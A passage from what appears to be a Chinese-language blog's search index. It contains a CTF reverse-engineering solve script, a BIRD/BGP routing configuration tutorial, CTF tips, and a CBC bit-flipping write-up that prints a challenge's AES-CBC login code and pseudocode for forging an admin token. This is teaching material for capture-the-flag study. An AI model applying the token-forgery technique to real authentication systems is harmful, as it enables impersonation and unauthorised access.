class=\"line\">a1 = <span class=\"string\">&#x27;(_@4620!08!6_0*0442!@186%%0@3=66!!974*3234=&amp;0^3&amp;1@=&amp;0908!6_0*&amp;&#x27;</span></span><br><span class=\"line\">a2 = <span class=\"string\">&#x27;55565653255552225565565555243466334653663544426565555525555222&#x27;</span></span><br><span class=\"line\">r = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x3e</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> s1[<span class=\"built_in\">ord</span>(c) % <span class=\"number\">23</span>] == a1[i] <span class=\"keyword\">and</span> s1[<span class=\"built_in\">ord</span>(c) // <span class=\"number\">23</span>] == a2[i]:</span><br><span class=\"line\">           r += c</span><br><span class=\"line\">           <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(r)</span><br><span class=\"line\"><span class=\"comment\"># private: char * __thiscall R0Pxx::My_Aut0_PWN(unsigned char *)</span></span><br><span class=\"line\">inp1 = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz12345&quot;</span></span><br><span class=\"line\">out1 = <span class=\"string\">&quot;pqhrsidtujvwkebxylz1mf23n45ogca.&quot;</span></span><br><span class=\"line\">ss = <span class=\"string\">&quot;?My_Aut0_PWN@R0Pxx@@AAEPADPAE@Z&quot;</span></span><br><span class=\"line\">flag = [<span class=\"number\">0</span>] * <span class=\"number\">31</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">31</span>):</span><br><span class=\"line\">    flag[inp1.find(out1[i])] = ss[i]</span><br><span class=\"line\">real_inp = <span class=\"string\">&#x27;&#x27;</span>.join(flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(real_inp, hashlib.md5(real_inp.encode()).hexdigest())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Z0@tRAEyuP@xAAA?M_A0_WNPx@@EPDP 63b148e750fed3a33419168ac58083f5</span></span><br></pre></td></tr></table></figure>\r\n","categories":["CTF"],"tags":["reverse","c/c++"]},{"title":"BIRD 入门","url":"/2022/09/12/BIRD-%E5%85%A5%E9%97%A8/","content":"<p>BIRD，即BIRD Internet Routing Daemon，是一个开源软件，支持各类标准路由协议，包括BGP，RIP和OSPF。本文主要关注BGP和OSPF协议，下面对其进行简单介绍。</p>\r\n<span id=\"more\"></span>\r\n<p>BIRD配置文件<code>bird.conf</code>位于<code>/etc/bird</code>文件目录下。其配置十分复杂且跟协议相关，详细的配置可参考<a href=\"https://bird.network.cz/\">BIRD manual</a>，本文仅关注Emulator所依赖的features。</p>\r\n<p><strong>BIRD 路由表</strong> 路由协议的主要功能是作为协议参与者与其对等者（peers）交换信息，这些路由信息存放在路由表中。BIRD在内存中存放有数个路由表，这些路由表如何接收或导出其数据被称为<code>protocol</code>。在某些例子中，这些协议是真正的路由协议，如bgp，rip，ospf，将导出或导入到各类路由器的路由表中。但某些协议不是真正的路由协议，BIRD使用<code>protocol</code>关键字，指明BIRD路由表从哪获取路由，并将路由发送何处。这些特殊的<code>protocol</code>用于指明数据如何从一个路由表流向另一个路由表。</p>\r\n<figure>\r\n<img src=\"/2022/09/12/BIRD-%E5%85%A5%E9%97%A8/image-20220912212527054-16629891354721.png\" alt=\"image-20220912212527054\"><figcaption aria-hidden=\"true\">image-20220912212527054</figcaption>\r\n</figure>\r\n<h2 id=\"pipe-between-tables\">Pipe Between Tables</h2>\r\n<p>对于IPv4，仅存储在BIRD主表<code>master4</code>中的路由将会被导出到内核的路由表中（通过<code>kernel</code>协议）。如果未指明协议中的表名，将会默认使用master table。对于不同的协议将会使用不同的表名，这些路由将使用<code>pipe</code>协议传送到master table中。</p>\r\n<p><code>pipe</code>协议连接两个路由表，分别为主表（使用<code>table</code>关键字）和次表（使用<code>peer</code>关键字）。在import和export两个方向中可以使用filter过滤路由信息。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">protocol pipe &#123;</span><br><span class=\"line\">\ttable t_bgp;</span><br><span class=\"line\">\tpeer table master4;</span><br><span class=\"line\">\timport none;</span><br><span class=\"line\">\texport all;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>上述的例子中，所有t_bgp的表项被导出到master4表中，但master4中没有任何路由被导入到t_bgp中。在下列的例子中，所有t_direct表中的路由项被导出到t_bgp表中，且路由的local preference属性设为40。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">protocol pipe &#123;</span><br><span class=\"line\">\ttable t_direct;</span><br><span class=\"line\">\tpeer table t_bgp;</span><br><span class=\"line\">\timport none;</span><br><span class=\"line\">\texport filter &#123; bgp_local_pref = <span class=\"number\">40</span>; accept; &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"bgp路由表与kernel路由表\">BGP路由表与Kernel路由表</h2>\r\n<p>BIRD没有真正用于路由的路由表，真正用于路由的路由表叫kernel路由表，位于系统kernel中，但kernel路由表取决于路由协议学习真正的路由。为此，BIRD提供<code>kernel</code>协议用于连接BIRD的路由表与kernel路由表。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">protocol kernel &#123;</span><br><span class=\"line\">\tipv4 &#123;</span><br><span class=\"line\">\t\timport all;</span><br><span class=\"line\">\t\texport all;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tlearn;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>上述的例子中，未指定路由表名，因此默认为master表（master4用于IPv4）。“import all”表示BIRD将从kernel路由表导入所有信息到master4表，“export all”表示master4表中所有路由信息将导出到kernel路由表中。</p>\r\n<h2 id=\"device-协议\">device 协议</h2>\r\n<p>每个BGP路由器中都有一个叫<code>device</code>的强制协议，该协议不是真正的路由协议，不生成任何路由，也不接受任何路由。该协议仅用于从kernel中获取网卡信息。在Emulator中，该协议仅为一个empty block。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">protocol device &#123; &#125;</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"bgpas所有的ip前缀\">BGP：AS所有的IP前缀</h2>\r\n<p>在BGP协议中，每个BGP路由器需要告知Internet其代表的自治系统所拥有的网络前缀，告知其他AS本AS是这些IP前缀的所有者。BGP路由器如何知道这些前缀属于自身AS？BGP路由器可以通过以下几种方法获取该信息。</p>\r\n<ol type=\"1\">\r\n<li>从BGP路由器所附加的网络中</li>\r\n<li>从配置文件添加的静态表项中</li>\r\n<li>从IBGP（Interior BGP）和IGP（Internal Gateway Protocol）中，例如从其他属于同一AS的路由器中。</li>\r\n</ol>\r\n<h3 id=\"使用direct协议生成路由\">使用direct协议生成路由</h3>\r\n<p>每个BGP路由器附加在AS的一个或多个内部网络中，因此可以从自身网卡所在的网络中获取IP前缀。BIRD使用<code>direct</code>协议来收集这些IP前缀信息，并且生成相应的路由。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">protocol direct local_nets &#123; <span class=\"meta\"># give it a customized name: local_nets</span></span><br><span class=\"line\">\tipv4 &#123;</span><br><span class=\"line\">\t\ttable t_direct;</span><br><span class=\"line\">\t\t<span class=\"meta\"># import all the generated routes to t_direct</span></span><br><span class=\"line\">\t\timport all;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tinterface <span class=\"string\">&quot;eth0&quot;</span>;</span><br><span class=\"line\">\tinterface <span class=\"string\">&quot;eth1&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>在<code>direct</code>协议中，<code>interface</code>关键字用于从接口中生成路由。假定BGP路由器分别使用 <em>eth0</em> 和 <em>eth1</em> 连接到自治系统的内部网络 <em>10.150.0.0./24</em> 和 <em>10.150.1.0/24</em> ，direct协议将会生成对于 <em>10.150.0.0./24</em> 和 <em>10.150.1.0/24</em> 的路由项，存储到t_direct表中。 使用<code>birdc show route</code>命令列出每个表中的路由项。</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">birdc show route all table t direct 10.150.0.0/24</span></span><br><span class=\"line\">Table t_direct:</span><br><span class=\"line\">10.150.0.0/24 unicast [local_nets 13:51:05.189] * (240)</span><br><span class=\"line\">dev net0</span><br><span class=\"line\">Type: device univ</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">birdc show route all table t bgp 10.150.0.0/24</span></span><br><span class=\"line\">Table t_bgp:</span><br><span class=\"line\">10.150.0.0/24 unicast [local_nets 13:51:05.189] * (240)</span><br><span class=\"line\">dev net0</span><br><span class=\"line\">Type: device univ</span><br><span class=\"line\">BGP.local_pref: 40</span><br><span class=\"line\">BGP.large_community: (150, 0, 0)</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">birdc show route all table master4 10.150.0.0/24</span></span><br><span class=\"line\">Table master4:</span><br><span class=\"line\">10.150.0.0/24 unicast [local_nets 13:51:05.189] * (240)</span><br><span class=\"line\">dev net0</span><br><span class=\"line\">Type: device univ</span><br><span class=\"line\">BGP.local_pref: 40</span><br><span class=\"line\">BGP.large_community: (150, 0, 0)</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"从static协议中生成路由\">从static协议中生成路由</h3>\r\n<p>BIRD使用<code>static</code>协议在BGP配置文件中添加静态IP前缀信息，该协议同样不是真正的协议，因为该协议不支持从peer中导入路由，仅提供预定义的路由信息。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">protocol <span class=\"type\">static</span> &#123;</span><br><span class=\"line\">\tipv4 &#123;</span><br><span class=\"line\">\t\ttable t_bgp;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\troute <span class=\"number\">10.150</span><span class=\"number\">.1</span><span class=\"number\">.0</span>/<span class=\"number\">24</span> via <span class=\"number\">10.150</span><span class=\"number\">.0</span><span class=\"number\">.254</span> &#123;</span><br><span class=\"line\">\t\tbgp_large_community.add(LOCAL_COMM);</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\troute <span class=\"number\">10.150</span><span class=\"number\">.2</span><span class=\"number\">.0</span>/<span class=\"number\">24</span> blackhole &#123;</span><br><span class=\"line\">\t\tbgp_large_community.add(LOCAL_COMM);</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"asn和ip前缀\">ASN和IP前缀</h3>\r\n<p>现实世界中，我们需要知道一个特定的AS所拥有的IP前缀和特定的IP前缀属于哪个AS。可以使用RADB数据库获取该信息。示例如下：</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">whois -h whois.radb.net -- <span class=\"string\">&#x27;-i origin AS11872&#x27;</span> | grep route</span></span><br><span class=\"line\">route:      128.230.0.0/16</span><br><span class=\"line\">route:      149.119.0.0/16</span><br><span class=\"line\">route:      128.230.0.0/17</span><br><span class=\"line\">route:      128.230.128.0/17</span><br><span class=\"line\">route:      128.230.0.0/18</span><br><span class=\"line\">route:      128.230.64.0/18</span><br><span class=\"line\">route:      128.230.128.0/18</span><br><span class=\"line\">route:      128.230.192.0/18</span><br><span class=\"line\">route:      128.230.0.0/19</span><br><span class=\"line\">route:      128.230.32.0/19</span><br><span class=\"line\">route:      128.230.64.0/19</span><br><span class=\"line\">route:      128.230.96.0/19</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">whois -h whois.radb.net 110.75.129.5</span></span><br><span class=\"line\">route:          110.75.129.0/24</span><br><span class=\"line\">descr:          Alibaba (US) Technology Co., Ltd.</span><br><span class=\"line\">origin:         AS45102</span><br><span class=\"line\">mnt-by:         MAINT-CNNIC-AP</span><br><span class=\"line\">last-modified:  2020-06-28T00:10:33Z</span><br><span class=\"line\">source:         APNIC</span><br><span class=\"line\"></span><br><span class=\"line\">route:          110.75.129.0/24</span><br><span class=\"line\">descr:          Alibaba (US) Technology Co., Ltd.</span><br><span class=\"line\">origin:         AS37963</span><br><span class=\"line\">mnt-by:         MAINT-CNNIC-AP</span><br><span class=\"line\">last-modified:  2020-06-28T00:09:56Z</span><br><span class=\"line\">source:         APNIC</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"bgp-peering\">BGP Peering</h2>\r\n<p>在IX-100中，AS-150，AS-151，AS-2，AS-3和AS-4都连接到IX-100网络 <em>0.100.0.0/24</em>。每个自治系统都有BGP路由器连接到该网络中，且属于物理连接，但并不意味着自治系统已经与其他系统进行了对等连接，为了建立对等连接，每个BGP路由器需要设置<code>peering</code>关系。</p>\r\n<figure>\r\n<img src=\"/2022/09/12/BIRD-%E5%85%A5%E9%97%A8/IX-100.png\" alt=\"IX-100\"><figcaption aria-hidden=\"true\">IX-100</figcaption>\r\n</figure>\r\n<h3 id=\"建立peering关系\">建立Peering关系</h3>\r\n<p>在两个BGP路由器物理连接后，需要设置BGP peering用于相互通信和交换路由信息。BGP路由器可以建立多个peer，每个叫做 <em>peering session</em>。BIRD使用<code>bgp</code>协议建立 <em>peering session</em>。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">protocol bgp u_as2 &#123;</span><br><span class=\"line\">\tipv4 &#123;</span><br><span class=\"line\">\t\ttable t_bgp;</span><br><span class=\"line\">\t\timport filter &#123;</span><br><span class=\"line\">\t\t\t... omitted ...</span><br><span class=\"line\">\t\t&#125;;</span><br><span class=\"line\">\t\texport where ... filter omitted ...</span><br><span class=\"line\">\t\tnext hop self;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tlocal <span class=\"number\">10.100</span><span class=\"number\">.0</span><span class=\"number\">.150</span> as <span class=\"number\">150</span>;</span><br><span class=\"line\">\tneighbor <span class=\"number\">10.100</span><span class=\"number\">.0</span><span class=\"number\">.2</span> as <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p><strong>local 选项</strong>：指定了路由器属于哪个AS和路由器的IP地址，该IP地址应当属于IX网络（IX网络段为10.100.0.0/24）。IP地址是可选的，但当路由器具有多个IP地址时，可以避免BGP session选择错误的IP地址。</p>\r\n<p><strong>neighnor 选项</strong>：指定了peer的IP地址和peer所属的AS，该IP地址同样属于IX网络。</p>\r\n<p><strong>IPv4 channel和路由表</strong>：每个协议都通过channel连接到一个路由表。BGP支持IPv4和IPv6 channel，每个channel包含两个filter，分别为import和export filter，能够接收，拒绝和修改路由。</p>\r\n<h3 id=\"import和export-filters\">Import和Export Filters</h3>\r\n<p>当导入和导出路由时，可以使用过滤规则。BIRD包含简单的编程语言，其过滤规则为程序。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">table t_bgp;</span><br><span class=\"line\">import filter &#123;</span><br><span class=\"line\">\tbgp_large_community.add(PROVIDER_COMM);</span><br><span class=\"line\">\tbgp_local_pref = <span class=\"number\">10</span>;</span><br><span class=\"line\">\taccept;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">export where bgp_large_community ˜ [LOCAL_COMM, CUSTOMER_COMM];</span><br></pre></td></tr></table></figure>\r\n<p>在上述的例子中，当路由从peer中导入时，社区信息将被添加且local preference值被设为10，当路由导出到peer时，仅属于LOCAL_COMM和CUSTOMER_COMM 社区的路由将会被导出。 路由具有许多属性，filter可以通过预定义的变量访问这些属性，部分预定义变量如下：</p>\r\n<ul>\r\n<li>net：路由网络前缀</li>\r\n<li>bgp_path：路由AS路径</li>\r\n<li>bgp_local_pref：路由的本地preference值，用于路径选择</li>\r\n<li>bgp_next_hop：转发包到目的地的下一跳</li>\r\n<li>bgp_large_community：与路由相关的large 社区值列表</li>\r\n</ul>\r\n<h3 id=\"peering-via-路由服务器\">Peering via 路由服务器</h3>\r\n<p>Internet exchanges提供叫 <code>router server</code>的特别服务器，N个自治系统仅需要连接到该路由服务器便可以互相交换路由信息。<code>route server</code>从BGP的参与者接收到路由时，将会转发其他所有的参与者，其功能类似于多播。 AS-2，AS-3和AS-4通过<code>router server</code>与其他互相连接，其中AS-2 BGP路由器的BGP表项如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">protocol bgp p_rs100 &#123;</span><br><span class=\"line\">\tipv4 &#123;</span><br><span class=\"line\">\t\ttable t_bgp;</span><br><span class=\"line\">\t\timport filter &#123;</span><br><span class=\"line\">\t\t\tbgp_large_community.add(PREE_COMM);</span><br><span class=\"line\">\t\t\tbgp_local_pref = <span class=\"number\">20</span>;</span><br><span class=\"line\">\t\t\taccept;</span><br><span class=\"line\">\t\t&#125;;</span><br><span class=\"line\">\t\texport where bgp_large_community ~ [LOCAL_COMM, CUSTOMER_COMM];</span><br><span class=\"line\">\t\tnext_hop self;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\tlocal <span class=\"number\">10.100</span><span class=\"number\">.0</span><span class=\"number\">.2</span> as <span class=\"number\">2</span>;</span><br><span class=\"line\">\tneighbor <span class=\"number\">10.100</span><span class=\"number\">.0</span><span class=\"number\">.100</span> as <span class=\"number\">100</span>; <span class=\"meta\"># peer with the route server</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>router server需要添加所有的AS-2，AS-3和AS-4的peering entry，包含“rs client”选项开启。</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">protocol bgp p_as2 &#123;</span><br><span class=\"line\">\tipv4 &#123;</span><br><span class=\"line\">\t\timport all;</span><br><span class=\"line\">\t\texport all;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\trs client;</span><br><span class=\"line\">\tlocal <span class=\"number\">10.100</span><span class=\"number\">.0</span><span class=\"number\">.100</span> as <span class=\"number\">100</span>;</span><br><span class=\"line\">\tneighbor <span class=\"number\">10.100</span><span class=\"number\">.0</span><span class=\"number\">.2</span> as <span class=\"number\">2</span>; ➙Peer with AS<span class=\"number\">-2</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"route-advertisements\">Route Advertisements</h3>\r\n<p>BGP路由器转发其路由消息时，该路由advertisement包含两个section：</p>\r\n<ul>\r\n<li><strong>路径属性</strong>：\r\n<ul>\r\n<li>Origin：定义路由信息来源，如internal或external路由协议</li>\r\n<li>AS Path：AS列表</li>\r\n<li>Next hop：下一跳路由器地址</li>\r\n</ul></li>\r\n<li><strong>网络层可达信息</strong>（NLRI）：从特定路径可达的IP前缀，例如 <em>100.5.0.0./24</em></li>\r\n</ul>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Internet Protocol Version 4, Src: 10.100.0.3, Dst: 10.100.0.150</span><br><span class=\"line\">Transmission Control Protocol, Src Port: 179, Dst Port: 33905, ...</span><br><span class=\"line\">Border Gateway Protocol - UPDATE Message</span><br><span class=\"line\">\tMarker: ffffffffffffffffffffffffffffffff</span><br><span class=\"line\">\tLength: 94</span><br><span class=\"line\">\tType: UPDATE Message (2)</span><br><span class=\"line\">\tWithdrawn Routes Length: 0</span><br><span class=\"line\">\tTotal Path Attribute Length: 67</span><br><span class=\"line\">\tPath attributes</span><br><span class=\"line\">\t\tPath Attribute - ORIGIN: IGP</span><br><span class=\"line\">\t\tPath Attribute - AS PATH: 3 12 164</span><br><span class=\"line\">\t\tPath Attribute - NEXT HOP: 10.100.0.3</span><br><span class=\"line\">\t\tPath Attribute - LARGE_COMMUNITY: 3:1:0 12:1:0 164:0:0</span><br><span class=\"line\">\tNetwork Layer Reachability Information (NLRI)</span><br><span class=\"line\">\t\t10.164.0.0/24</span><br><span class=\"line\">\t\t\tNLRI prefix length: 24</span><br><span class=\"line\">\t\t\tNLRI prefix: 10.164.0.0</span><br></pre></td></tr></table></figure>\r\n","categories":["工具"],"tags":["bird","network"]},{"title":"CTF随笔","url":"/2022/09/17/CTF%E9%9A%8F%E7%AC%94/","content":"<p>此帖用于记录打CTF过程中一些小技巧，以免忘记，可能会比较杂乱。</p>\r\n<ol type=\"1\">\r\n<li><p>perl程序逆向2</p>\r\n<ol type=\"1\">\r\n<li>perl是解释语言，perlapp只是把你的perl程序压缩后放在资源里面，执行的时候会解压的。</li>\r\n<li>逆向时可以查找<code>script</code>字符串，动态调试过程中找到引用该字符的指令并添加断点，逐步执行即可。</li>\r\n</ol></li>\r\n<li><p>dnspy对代码进行修改后，进行编译，需要保存，并重新载入才完成。</p></li>\r\n<li><p>安卓unity游戏的核心逻辑一般位于assets-CSharp.dll，将该dll拖入dnspy即可。</p></li>\r\n<li><p>C#里面字符串默认是Unicode，得到的字符串需要在每个字符后添加<code>\\x00</code>。</p></li>\r\n<li><p>linux as 汇编重复数据：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.rept 3 # 重复次数</span><br><span class=\"line\">.long 0 # 重复数据值</span><br><span class=\"line\">.endr</span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<ul>\r\n<li>.byte ：把8 位数当成数据插入到汇编中</li>\r\n<li>.hword： 把16位数当成数据插入到汇编中</li>\r\n<li>.long和 .int : 把32位数当成数据插入到汇编中</li>\r\n<li>.quad： 把64位数当成数据插入到汇编中</li>\r\n<li>.float: 把浮点数当成数据插入到汇编中</li>\r\n<li>.ascii “string” : 把 string 当作数据插入到汇编中，ascii\r\n伪操作定义的字符串需要自行添加结尾字符<code>\\0</code></li>\r\n<li>.asciz \"string\" ：类似 ascii, 在string 后面插入\r\n一个结尾字符 <code>\\0</code></li>\r\n</ul>\r\n</blockquote></li>\r\n<li><p>as\r\n使用intel语法，在命令中添加-msyntax=intel，或在asm文件中添加<code>.intel_syntax noprefix</code>标记</p></li>\r\n</ol>\r\n","categories":["CTF"],"tags":["reverse"]},{"title":"CBC反转攻击","url":"/2022/09/12/CBC%E5%8F%8D%E8%BD%AC%E6%94%BB%E5%87%BB/","content":"<h2 id=\"cbc-反转攻击\">CBC 反转攻击</h2>\r\n<span id=\"more\"></span>\r\n<ol type=\"1\">\r\n<li><p>查看文件内容</p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">flag = <span class=\"string\">&#x27;DASCTF&#123;********************************&#125;&#x27;</span></span><br><span class=\"line\">BLOCKSIZE = <span class=\"number\">16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pad</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    pad_len = BLOCKSIZE - (<span class=\"built_in\">len</span>(data) %</span><br><span class=\"line\">                        BLOCKSIZE) <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(data) % BLOCKSIZE != <span class=\"number\">0</span> <span class=\"keyword\">else</span> <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data + <span class=\"string\">&quot;=&quot;</span> * pad_len</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">unpad</span>(<span class=\"params\">data</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data.replace(<span class=\"string\">&quot;=&quot;</span>, <span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">enc</span>(<span class=\"params\">data, key, iv</span>):</span><br><span class=\"line\">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\">    encrypt = cipher.encrypt(pad(data))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> encrypt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dec</span>(<span class=\"params\">data, key, iv</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\">        encrypt = cipher.decrypt(data)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unpad(encrypt)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        exit()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">task</span>():</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\">        iv = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\">        pre = <span class=\"string\">&quot;yusa&quot;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">            choice = raw_input(menu)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> choice == <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">                name = raw_input(<span class=\"string\">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> name == <span class=\"string\">&#x27;admin&#x27;</span>:</span><br><span class=\"line\">                    exit()</span><br><span class=\"line\">                token = enc(pre+name, key, iv)</span><br><span class=\"line\">                <span class=\"built_in\">print</span> <span class=\"string\">&quot;Here is your token(in hex): &quot;</span>+iv.encode(<span class=\"string\">&#x27;hex&#x27;</span>)+token.encode(<span class=\"string\">&#x27;hex&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> choice == <span class=\"string\">&#x27;2&#x27;</span>:</span><br><span class=\"line\">                token = raw_input(<span class=\"string\">&quot;Your token(in hex): &quot;</span>).decode(<span class=\"string\">&#x27;hex&#x27;</span>)</span><br><span class=\"line\">                iv = token[:<span class=\"number\">16</span>]</span><br><span class=\"line\">                name = dec(token[<span class=\"number\">16</span>:], key, iv)</span><br><span class=\"line\">                <span class=\"built_in\">print</span> iv.encode(<span class=\"string\">&#x27;hex&#x27;</span>)+name.encode(<span class=\"string\">&#x27;hex&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> name[:<span class=\"number\">16</span>] == <span class=\"string\">&quot;yusa&quot;</span>*<span class=\"number\">4</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Hello, &quot;</span>+name[<span class=\"number\">16</span>:]</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> name[<span class=\"number\">16</span>:] == <span class=\"string\">&#x27;admin&#x27;</span>:</span><br><span class=\"line\">                        <span class=\"built_in\">print</span> flag</span><br><span class=\"line\">                        exit()</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        exit()</span><br><span class=\"line\"></span><br><span class=\"line\">menu = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">1. register</span></span><br><span class=\"line\"><span class=\"string\">2. login</span></span><br><span class=\"line\"><span class=\"string\">3. exit</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    task()</span><br></pre></td></tr></table></figure></p></li>\r\n<li><p>攻击思路 题目提示为CBC反转攻击，需要了解CBC反转攻击原因 <img src=\"/2022/09/12/CBC%E5%8F%8D%E8%BD%AC%E6%94%BB%E5%87%BB/27c02823d6c18308ea47bd1f21558f8b.png\" alt=\"27c02823d6c18308ea47bd1f21558f8b.png\"> 用户能够控制IV和密文输入，<span class=\"math inline\">\\(plain2 = cipher1 \\oplus Dec(cipher)\\)</span>，当用户的密文输入为<span class=\"math inline\">\\(cipher1 \\oplus plain2 \\oplus [tamperd]\\)</span>时，解密的<code>plain2</code>则被修改为 <span class=\"math display\">\\[\r\n cipher1 \\oplus plain2 \\oplus [tamperd] \\oplus Dec(cipher) = \\\\\r\n cipher1 \\oplus Dec(cipher) \\oplus plain2 \\oplus [tamperd] = \\\\\r\n plain2 \\oplus plain2 \\oplus [tamperd] =[tamperd]\r\n \\]</span> 因此，可以将login返回的token（iv和token）分别进行修改</p>\r\n<p><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">token = `xxxxxx`</span><br><span class=\"line\">iv = token[:32]</span><br><span class=\"line\">c1 = token[32:64]</span><br><span class=\"line\">c2 = token[64:]</span><br><span class=\"line\">s1 = c1 ^ 原文2 ^ 篡改内容</span><br><span class=\"line\"></span><br><span class=\"line\">token2 = send(iv+s1+c2)</span><br><span class=\"line\">s2 = token[:32] ^ 原文1 ^ iv</span><br><span class=\"line\">send(s2 + s1 + c2)</span><br></pre></td></tr></table></figure></p></li>\r\n</ol>\r\n","categories":["CTF"],"tags":["crypto"]},{"title":"Easy RSA","url":"/2022/09/12/Easy-RSA/","content":"<h2 id=\"easy-rsa\">Easy RSA</h2>\r\n<span id=\"more\"></span>\r\n<ol type=\"1\">\r\n<li><p>打开py文件，发现内容为：</p>\r\n<p><figure 